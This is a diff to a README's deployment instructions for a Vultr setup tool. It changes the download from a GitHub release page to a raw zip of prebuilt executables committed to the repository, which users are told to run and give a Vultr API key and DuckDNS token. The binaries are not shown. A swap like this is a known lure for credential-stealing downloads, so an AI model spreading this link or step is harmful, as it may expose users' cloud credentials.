@@ -41,9 +41,9 @@ Setup runs by itself on first boot (about 5 minutes): `ssh root@IP tail -f /var/
 ### Option A on Windows / phone-free PC: one program, no bash
 
 `mp-deploy-vultr` does the same as `deploy-vultr.sh`, built on Vultr's official Go library
-[govultr](https://github.com/vultr/govultr) (v3.34.0). Download it from the
-[v4.12 release](https://github.com/ThirtyFoxMCx00E1/wagu/releases/tag/v4.12)
-(`mp-deploy-vultr-windows-amd64.exe`, `-linux-amd64`, `-darwin-arm64`), double-click it, paste the
+[govultr](https://github.com/vultr/govultr) (v3.34.0). Download
+[mp-deploy-vultr-4.12.zip](https://github.com/ThirtyFoxMCx00E1/wagu/raw/main/release/mp-deploy-vultr-4.12.zip)
+(`mp-deploy-vultr-windows-amd64.exe`, `-linux-amd64`, `-darwin-arm64` inside), double-click it, paste the
 Vultr API key and the DuckDNS token when asked. `mp-deploy-vultr --list` shows the IPs; `asia oceania`
 creates only those. Source: `HiveMQ/providers/vultr-go/` (`bash build.sh`, Go 1.23+).
 
